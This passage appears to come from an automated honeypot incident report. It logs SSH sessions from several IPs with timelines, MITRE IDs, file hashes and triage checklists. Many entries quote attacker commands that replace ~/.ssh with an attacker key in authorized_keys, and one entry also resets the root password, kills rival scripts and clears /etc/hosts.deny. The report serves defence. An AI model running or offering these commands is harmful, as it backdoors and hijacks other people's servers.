| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:42:45` | `cowrie.session.connect` |
| `2026-04-14 20:42:45` | `cowrie.client.version` |
| `2026-04-14 20:42:46` | `cowrie.client.kex` |
| `2026-04-14 20:42:47` | `cowrie.login.success` |
| `2026-04-14 20:42:47` | `cowrie.session.params` |
| `2026-04-14 20:42:47` | `cowrie.command.input` |
| `2026-04-14 20:42:47` | `cowrie.command.failed` |
| `2026-04-14 20:42:47` | `cowrie.log.closed` |
| `2026-04-14 20:42:48` | `cowrie.session.params` |
| `2026-04-14 20:42:48` | `cowrie.command.input` |
| `2026-04-14 20:42:49` | `cowrie.session.file_download` |
| `2026-04-14 20:42:49` | `cowrie.log.closed` |
| `2026-04-14 20:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.83[.]70` to AbuseIPDB if not already reported
- [ ] Block `101.126.83[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c505041c905a

| Field | Detail |
|---|---|
| **Source IP** | `101.126.83[.]70` |
| **First Seen** | 2026-04-14 20:42 |
| **Last Seen** | 2026-04-14 20:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:42:55` | `cowrie.session.connect` |
| `2026-04-14 20:42:55` | `cowrie.client.version` |
| `2026-04-14 20:42:56` | `cowrie.client.kex` |
| `2026-04-14 20:42:57` | `cowrie.login.success` |
| `2026-04-14 20:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.83[.]70` to AbuseIPDB if not already reported
- [ ] Block `101.126.83[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13d2a10c8b63

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:45 |
| **Last Seen** | 2026-04-14 20:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:45:01` | `cowrie.session.connect` |
| `2026-04-14 20:45:01` | `cowrie.client.version` |
| `2026-04-14 20:45:01` | `cowrie.client.kex` |
| `2026-04-14 20:45:02` | `cowrie.login.success` |
| `2026-04-14 20:45:02` | `cowrie.session.params` |
| `2026-04-14 20:45:02` | `cowrie.command.input` |
| `2026-04-14 20:45:02` | `cowrie.command.failed` |
| `2026-04-14 20:45:03` | `cowrie.log.closed` |
| `2026-04-14 20:45:03` | `cowrie.session.params` |
| `2026-04-14 20:45:03` | `cowrie.command.input` |
| `2026-04-14 20:45:03` | `cowrie.session.file_download` |
| `2026-04-14 20:45:03` | `cowrie.log.closed` |
| `2026-04-14 20:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-becde07859ae

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:45 |
| **Last Seen** | 2026-04-14 20:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:45:06` | `cowrie.session.connect` |
| `2026-04-14 20:45:06` | `cowrie.client.version` |
| `2026-04-14 20:45:06` | `cowrie.client.kex` |
| `2026-04-14 20:45:07` | `cowrie.login.success` |
| `2026-04-14 20:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb68c4167921

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:48 |
| **Last Seen** | 2026-04-14 20:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:48:30` | `cowrie.session.connect` |
| `2026-04-14 20:48:30` | `cowrie.client.version` |
| `2026-04-14 20:48:30` | `cowrie.client.kex` |
| `2026-04-14 20:48:31` | `cowrie.login.success` |
| `2026-04-14 20:48:31` | `cowrie.session.params` |
| `2026-04-14 20:48:31` | `cowrie.command.input` |
| `2026-04-14 20:48:31` | `cowrie.command.failed` |
| `2026-04-14 20:48:32` | `cowrie.log.closed` |
| `2026-04-14 20:48:32` | `cowrie.session.params` |
| `2026-04-14 20:48:32` | `cowrie.command.input` |
| `2026-04-14 20:48:32` | `cowrie.session.file_download` |
| `2026-04-14 20:48:32` | `cowrie.log.closed` |
| `2026-04-14 20:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6483005a5b9b

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:48 |
| **Last Seen** | 2026-04-14 20:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:48:35` | `cowrie.session.connect` |
| `2026-04-14 20:48:35` | `cowrie.client.version` |
| `2026-04-14 20:48:35` | `cowrie.client.kex` |
| `2026-04-14 20:48:36` | `cowrie.login.success` |
| `2026-04-14 20:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f3385f13b7e

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:52 |
| **Last Seen** | 2026-04-14 20:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:52:01` | `cowrie.session.connect` |
| `2026-04-14 20:52:01` | `cowrie.client.version` |
| `2026-04-14 20:52:02` | `cowrie.client.kex` |
| `2026-04-14 20:52:03` | `cowrie.login.success` |
| `2026-04-14 20:52:03` | `cowrie.session.params` |
| `2026-04-14 20:52:03` | `cowrie.command.input` |
| `2026-04-14 20:52:03` | `cowrie.command.failed` |
| `2026-04-14 20:52:03` | `cowrie.log.closed` |
| `2026-04-14 20:52:04` | `cowrie.session.params` |
| `2026-04-14 20:52:04` | `cowrie.command.input` |
| `2026-04-14 20:52:04` | `cowrie.session.file_download` |
| `2026-04-14 20:52:04` | `cowrie.log.closed` |
| `2026-04-14 20:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18fc443208c1

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:52 |
| **Last Seen** | 2026-04-14 20:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:52:07` | `cowrie.session.connect` |
| `2026-04-14 20:52:07` | `cowrie.client.version` |
| `2026-04-14 20:52:07` | `cowrie.client.kex` |
| `2026-04-14 20:52:08` | `cowrie.login.success` |
| `2026-04-14 20:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ff3af7f940

| Field | Detail |
|---|---|
| **Source IP** | `124.156.129[.]246` |
| **First Seen** | 2026-04-14 20:52 |
| **Last Seen** | 2026-04-14 20:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:52:13` | `cowrie.session.connect` |
| `2026-04-14 20:52:13` | `cowrie.client.version` |
| `2026-04-14 20:52:13` | `cowrie.client.kex` |
| `2026-04-14 20:52:13` | `cowrie.login.success` |
| `2026-04-14 20:52:14` | `cowrie.session.params` |
| `2026-04-14 20:52:14` | `cowrie.command.input` |
| `2026-04-14 20:52:14` | `cowrie.command.failed` |
| `2026-04-14 20:52:14` | `cowrie.log.closed` |
| `2026-04-14 20:52:14` | `cowrie.session.params` |
| `2026-04-14 20:52:14` | `cowrie.command.input` |
| `2026-04-14 20:52:14` | `cowrie.session.file_download` |
| `2026-04-14 20:52:14` | `cowrie.log.closed` |
| `2026-04-14 20:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.156.129[.]246` to AbuseIPDB if not already reported
- [ ] Block `124.156.129[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c765a53281d0

| Field | Detail |
|---|---|
| **Source IP** | `124.156.129[.]246` |
| **First Seen** | 2026-04-14 20:52 |
| **Last Seen** | 2026-04-14 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:52:16` | `cowrie.session.connect` |
| `2026-04-14 20:52:16` | `cowrie.client.version` |
| `2026-04-14 20:52:17` | `cowrie.client.kex` |
| `2026-04-14 20:52:17` | `cowrie.login.success` |
| `2026-04-14 20:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.156.129[.]246` to AbuseIPDB if not already reported
- [ ] Block `124.156.129[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca15e63aa46e

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:53 |
| **Last Seen** | 2026-04-14 20:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:53:44` | `cowrie.session.connect` |
| `2026-04-14 20:53:44` | `cowrie.client.version` |
| `2026-04-14 20:53:44` | `cowrie.client.kex` |
| `2026-04-14 20:53:45` | `cowrie.login.success` |
| `2026-04-14 20:53:45` | `cowrie.session.params` |
| `2026-04-14 20:53:45` | `cowrie.command.input` |
| `2026-04-14 20:53:45` | `cowrie.command.failed` |
| `2026-04-14 20:53:46` | `cowrie.log.closed` |
| `2026-04-14 20:53:46` | `cowrie.session.params` |
| `2026-04-14 20:53:46` | `cowrie.command.input` |
| `2026-04-14 20:53:46` | `cowrie.session.file_download` |
| `2026-04-14 20:53:46` | `cowrie.log.closed` |
| `2026-04-14 20:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dc97638b3da

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:53 |
| **Last Seen** | 2026-04-14 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:53:49` | `cowrie.session.connect` |
| `2026-04-14 20:53:49` | `cowrie.client.version` |
| `2026-04-14 20:53:50` | `cowrie.client.kex` |
| `2026-04-14 20:53:51` | `cowrie.login.success` |
| `2026-04-14 20:53:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25709dc26f85

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]214` |
| **First Seen** | 2026-04-14 20:54 |
| **Last Seen** | 2026-04-14 20:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:54:55` | `cowrie.session.connect` |
| `2026-04-14 20:54:55` | `cowrie.client.version` |
| `2026-04-14 20:54:56` | `cowrie.client.kex` |
| `2026-04-14 20:54:56` | `cowrie.login.success` |
| `2026-04-14 20:54:57` | `cowrie.session.params` |
| `2026-04-14 20:54:57` | `cowrie.command.input` |
| `2026-04-14 20:54:57` | `cowrie.command.failed` |
| `2026-04-14 20:54:57` | `cowrie.log.closed` |
| `2026-04-14 20:54:57` | `cowrie.session.params` |
| `2026-04-14 20:54:57` | `cowrie.command.input` |
| `2026-04-14 20:54:58` | `cowrie.session.file_download` |
| `2026-04-14 20:54:58` | `cowrie.log.closed` |
| `2026-04-14 20:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cdbc5364d2

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]214` |
| **First Seen** | 2026-04-14 20:55 |
| **Last Seen** | 2026-04-14 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:55:00` | `cowrie.session.connect` |
| `2026-04-14 20:55:00` | `cowrie.client.version` |
| `2026-04-14 20:55:00` | `cowrie.client.kex` |
| `2026-04-14 20:55:01` | `cowrie.login.success` |
| `2026-04-14 20:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a4800b80fc

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 20:57 |
| **Last Seen** | 2026-04-14 20:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:57:36` | `cowrie.session.connect` |
| `2026-04-14 20:57:36` | `cowrie.client.version` |
| `2026-04-14 20:57:36` | `cowrie.client.kex` |
| `2026-04-14 20:57:36` | `cowrie.login.success` |
| `2026-04-14 20:57:36` | `cowrie.session.params` |
| `2026-04-14 20:57:36` | `cowrie.command.input` |
| `2026-04-14 20:57:36` | `cowrie.command.failed` |
| `2026-04-14 20:57:36` | `cowrie.log.closed` |
| `2026-04-14 20:57:37` | `cowrie.session.params` |
| `2026-04-14 20:57:37` | `cowrie.command.input` |
| `2026-04-14 20:57:37` | `cowrie.session.file_download` |
| `2026-04-14 20:57:37` | `cowrie.log.closed` |
| `2026-04-14 20:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4a0b53f01ff

| Field | Detail |
|---|---|
| **Source IP** | `42.96.43[.]148` |
| **First Seen** | 2026-04-14 20:57 |
| **Last Seen** | 2026-04-14 20:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:57:39` | `cowrie.session.connect` |
| `2026-04-14 20:57:39` | `cowrie.client.version` |
| `2026-04-14 20:57:39` | `cowrie.client.kex` |
| `2026-04-14 20:57:39` | `cowrie.login.success` |
| `2026-04-14 20:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.96.43[.]148` to AbuseIPDB if not already reported
- [ ] Block `42.96.43[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f646fa16afe

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-04-14 20:58 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:yJk1i4ASjnV9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
